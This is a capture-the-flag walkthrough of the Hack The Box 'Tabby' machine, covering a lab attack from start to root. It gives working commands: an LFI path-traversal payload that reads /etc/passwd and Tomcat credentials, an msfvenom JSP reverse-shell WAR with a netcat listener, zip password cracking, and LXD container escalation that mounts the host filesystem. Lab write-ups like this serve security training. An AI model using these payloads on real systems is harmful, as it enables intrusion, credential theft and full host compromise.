# Hack The Box: Tabby

**Difficulty:** Easy
**OS:** Linux

Tabby is an Easy-level Linux machine designed to highlight vulnerabilities in common Java web application servers. The initial foothold is achieved by discovering a Local File Inclusion (LFI) vulnerability to read configuration files, extracting credentials, and deploying a malicious WAR file to Apache Tomcat. Privilege escalation involves pivoting through a user account and exploiting a vulnerable LXD/LXC configuration to gain a root shell.

---

## Reconnaissance

The assessment begins with a standard Nmap scan against the target IP address to discover open ports and running services.

```bash
nmap -p- --min-rate 10000 10.10.10.194
nmap -p 22,80,8080 -sCV 10.10.10.194
```

The scan reveals the following open ports:
*   **Port 22:** SSH (OpenSSH 8.2p1 Ubuntu)
*   **Port 80:** HTTP (Apache httpd 2.4.41)
*   **Port 8080:** HTTP (Apache Tomcat 9.0.31)

Navigating to the web service on port 80 displays a landing page for "Mega Hosting," a corporate website. We add `megahosting.htb` to our local `/etc/hosts` file based on information typically found on the landing page or through subdomain enumeration.

```bash
echo "10.10.10.194 megahosting.htb" >> /etc/hosts
```

Accessing `http://megahosting.htb` reveals standard corporate information. Directory enumeration using `feroxbuster` or `gobuster` identifies a news or articles endpoint (`/news.php` or similar). We explore the site's functionality.

## Web Application Analysis

The application features a mechanism to view news articles, often passing the filename or ID as a parameter (e.g., `?file=statement.html`). This structure strongly suggests a Local File Inclusion (LFI) vulnerability.

### Exploiting LFI (Local File Inclusion)

We test the `file` parameter with standard LFI payloads, attempting to traverse directories to read sensitive files.

```text
http://megahosting.htb/news.php?file=../../../../../../../etc/passwd
```

The application successfully returns the contents of the `/etc/passwd` file within the webpage, confirming the LFI vulnerability. We identify standard system users, including one named `ash`.

Our next objective is to leverage this LFI to achieve Remote Code Execution (RCE). We check for common LFI-to-RCE vectors, such as reading Apache access logs (`/var/log/apache2/access.log`) to perform log poisoning, or interacting with the SSH service to poison auth logs.

However, we also have Apache Tomcat running on port 8080. A common path to RCE in Tomcat environments involves accessing the Tomcat Manager application and deploying a malicious `.war` file (a Java web archive containing a web shell).

### Extracting Tomcat Credentials via LFI

To deploy a `.war` file, we need administrative credentials for the Tomcat Manager. Tomcat stores its user configurations and passwords in an XML file typically located at `/usr/share/tomcat9/conf/tomcat-users.xml` or `/etc/tomcat9/tomcat-users.xml`.

We craft an LFI payload to read this specific configuration file.

```text
http://megahosting.htb/news.php?file=../../../../../../../usr/share/tomcat9/conf/tomcat-users.xml
```

The server response contains the `tomcat-users.xml` file, revealing the username and password for the "manager-script" or "manager-gui" roles.

```xml
<user username="tomcat" password="<Discovered_Password>" roles="manager-gui,admin-gui,manager-script"/>
```

## Initial Access

With valid credentials (`tomcat:<Discovered_Password>`), we can interact with the Apache Tomcat instance on port 8080.

### Deploying a Malicious WAR File

We navigate to the Tomcat Manager portal (`http://10.10.10.194:8080/manager/html`) and authenticate. Once inside, we have the option to upload and deploy a WAR file.

We generate a malicious `.war` file using `msfvenom` containing a Java reverse shell payload.

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.X LPORT=9999 -f war > shell.war
```

We deploy `shell.war` through the Tomcat Manager interface. After a successful deployment, the application appears in the list of active web applications (e.g., `/shell`).

We start a Netcat listener on our attacking machine.

```bash
nc -lnvp 9999
```

We access our deployed application by navigating to its endpoint (e.g., `http://10.10.10.194:8080/shell`). The server executes our JSP payload, and we catch a reverse shell.

```bash
# Connection received
id
# uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
```

## Lateral Movement

We gain initial access as the `tomcat` user. We stabilize our shell using Python (`python3 -c 'import pty; pty.spawn("/bin/bash")'`).

The `user.txt` flag is not accessible in our current directory, indicating we must pivot to the user `ash`.

Enumerating the system as `tomcat`, we check the `/var/www/html` directory and other application files for hardcoded database credentials or passwords, as well as backup archives (like `.zip` or `.bak` files).

During our enumeration, we discover a password-protected zip file containing backup data or source code.

```bash
ls -la /var/www/html/files/
```

We transfer the zip file to our attacking machine and use a tool like `fcrackzip` or `zip2john` combined with Hashcat or John the Ripper and the `rockyou.txt` wordlist to crack the archive's password.

```bash
zip2john backup.zip > backup_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt backup_hash.txt
```

The password cracks successfully (`admin@it`). Inside the extracted files, we find configuration data or a text file containing another password.

We test the cracked zip password (or any extracted passwords) for password reuse by attempting to authenticate via `su` or SSH as the system user `ash`.

```bash
su ash
Password: admin@it
# Authentication successful
```
We retrieve the `user.txt` flag from Ash's home directory.

## Privilege Escalation

Enumerating the system as `ash`, we check for group memberships.

```bash
id
```

The output reveals that the user `ash` is a member of the `lxd` group. LXD is a next-generation system container and virtual machine manager. Membership in the `lxd` group is notoriously insecure and essentially equates to root-level access on the host system.

### Exploiting LXD Group Membership

An attacker in the `lxd` group can create an LXC container, configure it to mount the host's entire root filesystem (`/`), and then start the container. Once inside the container, the attacker has root privileges and can access or modify any file on the mounted host filesystem.

First, we need an Alpine Linux image built specifically for LXC. We download the builder script or a pre-built Alpine image to our attacking machine.

```bash
# On attacking machine
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
sudo ./build-alpine
```

The script generates a `.tar.gz` file containing the Alpine image. We transfer this image to the target machine (e.g., using a Python HTTP server and `wget`).

Once the image is on the target machine, we import it into LXD.

```bash
lxc image import ./alpine-v3.13-x86_64-20210218_0127.tar.gz --alias myimage
```

We initialize a new container named `privesc` using the imported image and configure it to mount the host's root filesystem.

```bash
lxc init myimage privesc -c security.privileged=true
lxc config device add privesc mydevice disk source=/ path=/mnt/root recursive=true
```

Finally, we start the container and execute a shell inside it.

```bash
lxc start privesc
lxc exec privesc /bin/sh
```

Because the container runs as root and mounts the host's root filesystem to `/mnt/root`, we now have root-level access to the entire host machine.

```bash
# id
uid=0(root) gid=0(root)
```

The machine is fully compromised, and the `root.txt` flag can be retrieved from `/mnt/root/root/root.txt`.
